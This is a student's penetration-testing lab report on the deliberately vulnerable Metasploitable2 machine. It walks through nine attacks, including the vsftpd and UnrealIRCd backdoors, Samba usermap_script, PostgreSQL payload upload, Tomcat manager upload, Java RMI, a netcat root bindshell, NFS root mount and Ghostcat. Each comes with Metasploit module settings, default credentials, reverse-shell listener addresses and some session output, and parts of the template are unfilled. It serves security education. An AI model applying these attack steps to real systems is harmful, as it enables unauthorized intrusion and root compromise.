# Metasploitable2 Exploitation Report

**Name:** Azindo Abdul Razak
**Index Number:** 4186224
**Date:** 21/09/2026
**Target IP:** <Metasploitable2 IP>
**Attacker OS / Tools:** <e.g. Kali Linux 2026.x, Metasploit Framework x.x, nmap x.x>

---

## Reconnaissance Summary

<Your nmap scan command(s) and a summary of open ports/services found. Include the
scan output (as a code block) or reference a screenshot in evidence/recon.png.>

---

## ## Exploit 1: vsftpd 2.3.4 Backdoor

* **Service / Port:** FTP / 21

* **Vulnerability:** vsftpd 2.3.4 Backdoor Command Execution

* **Tool Used:** Metasploit Framework — `exploit/unix/ftp/vsftpd_234_backdoor`

* **Why This Tool:** Nmap identified vsftpd 2.3.4 running on port 21, and SearchSploit identified a specific backdoor command-execution vulnerability for this version. Metasploit provides a dedicated module for this vulnerability and was therefore appropriate for safely demonstrating the exploit in the Metasploitable2 lab.

* **Steps:**

  1. Used Nmap to identify FTP running on port 21 and fingerprinted the service as vsftpd 2.3.4.
  2. Used SearchSploit to confirm that vsftpd 2.3.4 has a backdoor command-execution exploit.
  3. Started Metasploit Framework with `msfconsole`.
  4. Searched for the vulnerability using `search vsftpd 2.3.4`.
  5. Selected the module `exploit/unix/ftp/vsftpd_234_backdoor`.
  6. Set the target with `set RHOSTS 10.0.2.3`.
  7. Set the Kali listener address with `set LHOST 10.0.2.15`.
  8. Ran the exploit with `exploit`.
  9. Metasploit successfully opened Meterpreter session 1.
  10. Verified the obtained access using `getuid`, `sysinfo`, and `pwd`.

* **Evidence:** `evidence/exploit1.png`

* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control (C2), Actions on Objectives

  * **Reconnaissance:** Nmap identified port 21 and fingerprinted the service as vsftpd 2.3.4. SearchSploit was then used to identify the corresponding vulnerability.
  * **Weaponization:** The Metasploit `vsftpd_234_backdoor` module and configured Meterpreter reverse TCP payload were selected for the attack.
  * **Delivery:** The configured exploit was sent to the FTP service running on `10.0.2.3:21`.
  * **Exploitation:** Metasploit confirmed that the target appeared vulnerable and reported that the backdoor had been spawned.
  * **Installation:** Successful exploitation resulted in a Meterpreter session being established on the target.
  * **Command & Control (C2):** The Meterpreter session provided an interactive remote-control channel from Kali to Metasploitable2.
  * **Actions on Objectives:** `getuid`, `sysinfo`, and `pwd` were used to verify the level of access and gather basic information about the compromised system.

* **Outcome / Impact:** A Meterpreter session was successfully obtained on Metasploitable2. The session reported `root` as the server username, demonstrating root-level access to the vulnerable system. The target was identified as Ubuntu 8.04 running Linux 2.6.24-16-server on an i686 architecture.

---

## ## Exploit 2: Samba "username map script" Command Execution

* **Service / Port:** Samba / 139

* **Vulnerability:** Samba "username map script" Command Execution

* **Tool Used:** Metasploit Framework — `exploit/multi/samba/usermap_script`

* **Why This Tool:** Nmap identified Samba 3.0.20-Debian on port 445 and the corresponding Samba service on port 139. Metasploit provided a dedicated module for the username map script command-execution vulnerability, making it suitable for demonstrating this vulnerability against the intentionally vulnerable Metasploitable2 system.

* **Steps:**

  1. Used Nmap to identify Samba running on ports 139 and 445 and fingerprinted the service as Samba 3.0.20-Debian.
  2. Searched Metasploit for Samba 3.0.20 vulnerabilities using `search samba 3.0.20`.
  3. Selected the module `exploit/multi/samba/usermap_script`.
  4. Set the target with `set RHOSTS 10.0.2.3`.
  5. Verified that the payload was configured with Kali's listener address `10.0.2.15` and port `4444`.
  6. Ran the exploit with `exploit`.
  7. Metasploit successfully opened command shell session 2 from the target to Kali.
  8. The shell session was subsequently exited after confirming that the session had been established.

* **Evidence:** `evidence/exploit2.png`

* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Command & Control (C2)

  * **Reconnaissance:** Nmap identified the Samba service and its version, and Metasploit was searched for a matching vulnerability.
  * **Weaponization:** The dedicated `usermap_script` Metasploit module and reverse Netcat payload were selected and configured.
  * **Delivery:** The configured exploit was sent to the Samba service on the target.
  * **Exploitation:** The vulnerable Samba username map script functionality was successfully triggered, resulting in a command shell session being opened.
  * **Command & Control (C2):** Metasploit established a reverse TCP command shell from `10.0.2.3` back to Kali at `10.0.2.15:4444`.

* **Outcome / Impact:** The exploit successfully opened command shell session 2 on the Metasploitable2 target. The session was subsequently closed manually. Unlike Exploit 1, no user identity was verified from this session before it was closed, so no specific privilege level is claimed for this exploit.

---
## Exploit 3: UnrealIRCd 3.2.8.1 Backdoor

* **Service / Port:** IRC / 6667

* **Vulnerability:** UnrealIRCd 3.2.8.1 Backdoor Command Execution

* **Tool Used:** Metasploit — `exploit/unix/irc/unreal_ircd_3281_backdoor`

* **Why This Tool:** Nmap identified an UnrealIRCd IRC service running on port 6667. Metasploit's `unreal_ircd_3281_backdoor` module is specifically designed to exploit the known backdoor command execution vulnerability in UnrealIRCd 3.2.8.1, making it appropriate for the identified service.

* **Steps:**

  1. Searched Metasploit for UnrealIRCd exploits:

     ```text
     search unrealircd
     ```
  2. The search identified:

     ```text
     exploit/unix/irc/unreal_ircd_3281_backdoor
     ```
  3. Selected the exploit module:

     ```text
     use exploit/unix/irc/unreal_ircd_3281_backdoor
     ```
  4. Configured the Metasploitable2 target:

     ```text
     set RHOSTS 10.0.2.3
     ```
  5. Configured the Kali Linux listener:

     ```text
     set LHOST 10.0.2.15
     ```
  6. Ran the exploit:

     ```text
     exploit
     ```
  7. Metasploit detected that the target was vulnerable and successfully opened a Meterpreter session:

     ```text
     [+] 10.0.2.3:6667 - The target appears to be vulnerable. UnrealIRCd detected after registration
     [*] 10.0.2.3:6667 - Sending IRC backdoor command
     [*] Meterpreter session 3 opened
     ```
  8. Verified the privileges and system information:

     ```text
     meterpreter > getuid
     Server username: root

     meterpreter > sysinfo
     Computer     : metasploitable.localdomain
     OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
     Architecture : i686
     Meterpreter  : x86/linux

     meterpreter > pwd
     /etc/unreal
     ```

* **Evidence:** `evidence/exploit3.png`

* **Cyber Kill Chain Stage(s):**

  * **Reconnaissance:** Nmap identified port 6667 as open and running the UnrealIRCd IRC service. This provided information about the target service that could be investigated for vulnerabilities.
  * **Weaponization:** The Metasploit `unreal_ircd_3281_backdoor` module provided the exploit and payload used to take advantage of the vulnerable UnrealIRCd installation.
  * **Delivery:** The exploit connected to the IRC service on port 6667 and sent the malicious IRC backdoor command to the target.
  * **Exploitation:** The vulnerable UnrealIRCd service executed the backdoor command, allowing the attacker to execute commands on the target.
  * **Installation:** Metasploit staged the Meterpreter payload on the target and executed it, resulting in a Meterpreter session.
  * **Command & Control:** A reverse connection was established from the Metasploitable2 machine to Kali Linux, creating Meterpreter session 3.
  * **Actions on Objectives:** The resulting session was verified with `getuid`, which showed that the attacker had **root-level access**. The system information and current working directory were also retrieved.

* **Outcome / Impact:** The exploit successfully compromised the UnrealIRCd service and opened a Meterpreter session with **root privileges** on Metasploitable2. This demonstrated that a vulnerable backdoored version of UnrealIRCd could allow remote command execution and complete system-level access.

#### Exploit 4: PostgreSQL Payload Execution

* **Service / Port:** PostgreSQL / 5432

* **Vulnerability:** PostgreSQL Payload Execution

* **Tool Used:** Metasploit — `exploit/linux/postgres/postgres_payload`

* **Why This Tool:** Nmap identified PostgreSQL running on port 5432, and the service was later identified by Metasploit as PostgreSQL 8.3.1. The `postgres_payload` module is specifically designed to authenticate to a PostgreSQL server and execute a payload through the database service, making it appropriate for this target.

* **Steps:**

  1. Nmap identified PostgreSQL running on port 5432:

     ```text
     5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
     ```
  2. Searched Metasploit for PostgreSQL modules:

     ```text
     search postgres
     ```
  3. Selected the PostgreSQL payload execution module:

     ```text
     use exploit/linux/postgres/postgres_payload
     ```
  4. Configured the target and PostgreSQL credentials:

     ```text
     set RHOSTS 10.0.2.3
     set USERNAME postgres
     set PASSWORD postgres
     set DATABASE postgres
     set LHOST 10.0.2.15
     ```
  5. Ran the exploit:

     ```text
     exploit
     ```
  6. Metasploit identified the PostgreSQL server as version 8.3.1 and successfully opened a Meterpreter session:

     ```text
     [*] 10.0.2.3:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu
     [*] 10.0.2.3:5432 - Uploaded as /tmp/zMIyRoYv.so
     [*] Sending stage (1062760 bytes) to 10.0.2.3
     [*] Meterpreter session 4 opened
     ```
  7. Verified the resulting access:

     ```text
     meterpreter > getuid
     Server username: postgres

     meterpreter > sysinfo
     Computer     : metasploitable.localdomain
     OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
     Architecture : i686
     Meterpreter  : x86/linux

     meterpreter > pwd
     /var/lib/postgresql/8.3/main
     ```

* **Evidence:** `evidence/exploit4.png`

* **Cyber Kill Chain Stage(s):**

  * **Reconnaissance:** Nmap identified PostgreSQL as an open service on port 5432. Further Metasploit output identified the server as PostgreSQL 8.3.1.
  * **Weaponization:** The Metasploit `postgres_payload` module prepared a payload designed to execute through the PostgreSQL service.
  * **Delivery:** The module authenticated to the PostgreSQL service and uploaded the payload to the target system.
  * **Exploitation:** The PostgreSQL service was used to execute the payload, resulting in a Meterpreter session.
  * **Installation:** The payload was uploaded to `/tmp/zMIyRoYv.so` and executed to establish the Meterpreter session.
  * **Command & Control:** A reverse connection was established from the Metasploitable2 system to Kali Linux, creating Meterpreter session 4.
  * **Actions on Objectives:** The resulting access was verified with `getuid`, which showed the `postgres` account. The working directory `/var/lib/postgresql/8.3/main` was also confirmed.

* **Outcome / Impact:** The exploit successfully compromised the PostgreSQL service and established a Meterpreter session with **`postgres` user privileges**. The session did not provide root privileges, but it demonstrated that the database service could be leveraged to execute a payload and obtain remote command access on the target.

## Exploit 5: Exposed Metasploitable Root Shell

* **Service / Port:** Bindshell / 1524

* **Vulnerability:** Exposed unauthenticated root command shell

* **Tool Used:** Netcat (`nc`)

* **Why This Tool:** Netcat can establish a direct TCP connection to the listening bindshell on port 1524, allowing us to interact with the exposed command shell.

* **Steps:**

  1. Confirmed that port 1524 was open using Nmap:

     ```bash
     nmap -sV 10.0.2.3
     ```
  2. Connected directly to the service:

     ```bash
     nc -nv 10.0.2.3 1524
     ```
  3. Verified the obtained privileges:

     ```bash
     id
     whoami
     ```

* **Evidence:** `networking/network-security/evidence/exploit5.png`

* **Cyber Kill Chain Stage(s):**

  * **Reconnaissance:** Nmap identified TCP port 1524 and reported it as the "Metasploitable root shell" service.
  * **Delivery:** Netcat established a connection from Kali to the exposed service on port 1524.
  * **Exploitation:** The connection immediately provided access to a command shell without requiring authentication.
  * **Actions on Objectives:** The `id` and `whoami` commands confirmed that the obtained shell had root privileges.

* **Outcome / Impact:** Successfully obtained an unauthenticated root command shell on Metasploitable2. The shell reported `uid=0(root) gid=0(root)`.

## Exploit 6: Apache Tomcat Manager Upload Code Execution

* **Service / Port:** Apache Tomcat / 8180

* **Vulnerability:** Tomcat Manager authenticated upload code execution

* **Tool Used:** Metasploit — `exploit/multi/http/tomcat_mgr_upload`

* **Why This Tool:** The Metasploitable2 host exposed Apache Tomcat on port 8180. This Metasploit module specifically uploads and deploys a Java payload through the Tomcat Manager application, making it appropriate for obtaining code execution through the exposed Manager interface.

* **Steps:**

  1. Identified Apache Tomcat running on port 8180 during Nmap reconnaissance.
  2. Selected the Metasploit module `exploit/multi/http/tomcat_mgr_upload`.
  3. Set `RHOSTS` to `10.0.2.3` and `RPORT` to `8180`.
  4. Set `TARGETURI` to `/manager`.
  5. Configured the Tomcat Manager credentials as username `tomcat` and password `tomcat`.
  6. Set `LHOST` to `10.0.2.15` and `LPORT` to `4444`.
  7. Ran `check`, which reported that the target appeared vulnerable.
  8. Ran `exploit`. Metasploit successfully uploaded and deployed a Java payload and opened a Meterpreter session.
  9. Verified the session using `getuid`, `sysinfo`, and `pwd`.

* **Evidence:** `networking/network-security/evidence/exploit6.png`

* **Cyber Kill Chain Stage(s):**

  * **Reconnaissance:** Nmap identified Apache Tomcat running on port 8180.
  * **Weaponization:** Metasploit prepared a Java Meterpreter payload for the Tomcat target.
  * **Delivery:** The payload was uploaded to the Tomcat Manager application.
  * **Exploitation:** The uploaded application was deployed and executed through the Tomcat Manager interface.
  * **Installation:** The temporary malicious application was deployed on the Tomcat server, although the module subsequently undeployed it.
  * **Command & Control (C2):** A reverse Meterpreter connection was established from the target to `10.0.2.15:4444`.
  * **Actions on Objectives:** The successful Meterpreter session provided command execution and access as the `tomcat55` user.

* **Outcome / Impact:** A Meterpreter session was successfully established on Metasploitable2. The session ran as `tomcat55`, not root. The target system was identified as Linux 2.6.24-16-server (i386), and the working directory was `/`.


## Exploit 7: Java RMI Server Insecure Configuration

* **Service / Port:** Java RMI Registry / 1099

* **Vulnerability:** Java RMI Server insecure default configuration with class loading enabled

* **Tool Used:** Metasploit — `exploit/multi/misc/java_rmi_server`

* **Why This Tool:** Nmap identified a Java RMI registry on port 1099, and the Metasploit module specifically targets Java RMI servers that allow remote class loading. The module was therefore appropriate for testing and exploiting this exposed service.

* **Steps:**

  1. Identified the Java RMI registry on port 1099 during reconnaissance.
  2. Selected `exploit/multi/misc/java_rmi_server` in Metasploit.
  3. Set `RHOSTS` to `10.0.2.3` and `RPORT` to `1099`.
  4. Set `SRVHOST` and `LHOST` to `10.0.2.15`.
  5. Ran `check`, which detected a Java RMI endpoint with class loading enabled and reported that the target was vulnerable.
  6. Ran `exploit`.
  7. Metasploit served a payload JAR and sent an RMI call to the target.
  8. A Meterpreter session was successfully opened.
  9. Verified the session using `getuid`, `sysinfo`, and `pwd`.

* **Evidence:** `networking/network-security/evidence/exploit7.png`

* **Cyber Kill Chain Stage(s):**

  * **Reconnaissance:** Nmap identified the Java RMI service on port 1099.
  * **Weaponization:** Metasploit generated a Java Meterpreter payload and prepared it as a JAR.
  * **Delivery:** The payload was made available through the attacker's HTTP server and requested by the vulnerable RMI service.
  * **Exploitation:** The RMI server's class-loading configuration allowed the remote payload to be loaded and executed.
  * **Installation:** The Meterpreter payload was loaded into the target's Java process, establishing the malicious session.
  * **Command & Control (C2):** The target established a reverse connection to the Kali listener on `10.0.2.15:4444`.
  * **Actions on Objectives:** The resulting Meterpreter session provided access as the `root` user.

* **Outcome / Impact:** The Java RMI vulnerability was successfully exploited. A Meterpreter session was established with **root privileges** (`uid 0`) on the Metasploitable2 system.


## Exploit 8: Unrestricted NFS Root Filesystem Export

* **Service / Port:** NFS / 2049

* **Vulnerability:** Unrestricted NFS export of the target's root filesystem

* **Tool Used:** NFS client utilities — `showmount` and `mount`

* **Why This Tool:** `showmount` identifies directories exported through NFS, while the NFS client can mount an accessible export. These tools directly demonstrate whether the target's filesystem is exposed to the attacker.

* **Steps:**

  1. Nmap reconnaissance identified NFS running on port 2049.
  2. Ran `showmount -e 10.0.2.3`.
  3. The target reported `/` as an NFS export available to all hosts (`*`).
  4. Created a local mount point using `sudo mkdir -p /mnt/msf_nfs`.
  5. Mounted the exported root filesystem using `sudo mount -t nfs 10.0.2.3:/ /mnt/msf_nfs`.
  6. Used `ls -la /mnt/msf_nfs` to verify access to the target filesystem.
  7. The mount output confirmed that the filesystem was mounted with read/write (`rw`) access.

* **Evidence:** `networking/network-security/evidence/exploit8.png`

* **Cyber Kill Chain Stage(s):**

  * **Reconnaissance:** Nmap identified the NFS service, and `showmount` revealed that the root filesystem was exported.
  * **Delivery:** The attacker requested and mounted the exposed NFS export from the target.
  * **Exploitation:** The insecure export configuration allowed the attacker to mount the target's root filesystem without appropriate host restrictions.
  * **Actions on Objectives:** The mounted filesystem provided access to the target's directories and files, including `/etc`, `/home`, `/root`, `/var`, and other system directories.

* **Outcome / Impact:** The target's entire root filesystem was successfully mounted on Kali through NFS. The export was accessible with read/write mount permissions, demonstrating significant unauthorized filesystem exposure.


## Exploit 9: Apache Tomcat Ghostcat

* **Service / Port:** Apache JServ Protocol (AJP) / 8009

* **Vulnerability:** Apache Tomcat Ghostcat (CVE-2020-1938)

* **Tool Used:** Metasploit — `auxiliary/admin/http/tomcat_ghostcat`

* **Why This Tool:** This module specifically targets the Ghostcat vulnerability in Tomcat's AJP connector and can retrieve files that should not be directly accessible through the web application.

* **Steps:**

  1. Nmap reconnaissance identified AJP running on TCP port 8009.
  2. In Metasploit, selected `auxiliary/admin/http/tomcat_ghostcat`.
  3. Set the target:
     `set RHOSTS 10.0.2.3`
  4. Confirmed the AJP port:
     `set RPORT 8009`
  5. Requested the Tomcat application configuration file:
     `set FILENAME /WEB-INF/web.xml`
  6. Ran the module with `run`.
  7. The target returned the contents of `/WEB-INF/web.xml`, and Metasploit saved the retrieved file as a loot file.

* **Evidence:** `networking/network-security/evidence/exploit9.png`

* **Cyber Kill Chain Stage(s):**

  * **Reconnaissance:** Nmap identified the exposed AJP service on TCP port 8009.
  * **Weaponization:** The Metasploit Ghostcat module was selected and configured to exploit the vulnerable AJP connector.
  * **Delivery:** The malicious AJP request was sent to the target Tomcat server.
  * **Exploitation:** The vulnerable AJP connector processed the request and returned the contents of `/WEB-INF/web.xml`.
  * **Actions on Objectives:** The attack achieved unauthorized retrieval of a file from the Tomcat application.

* **Outcome / Impact:** Successful unauthorized file disclosure. The contents of `/WEB-INF/web.xml` were retrieved from the target and saved by Metasploit. No shell or privilege escalation was obtained from this exploit.


## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. <title> | ✔ | ✔ | ✔ | ✔ | | | |
| 2. <title> | | | | | | | |
| ... | | | | | | | |
| 10. <title> | | | | | | | |

---

## Lessons Learned / Mitigations (optional but recommended)

<For at least 2–3 of your exploits, what would actually fix the vulnerability
(patch, config change, disabling a service, etc.)?>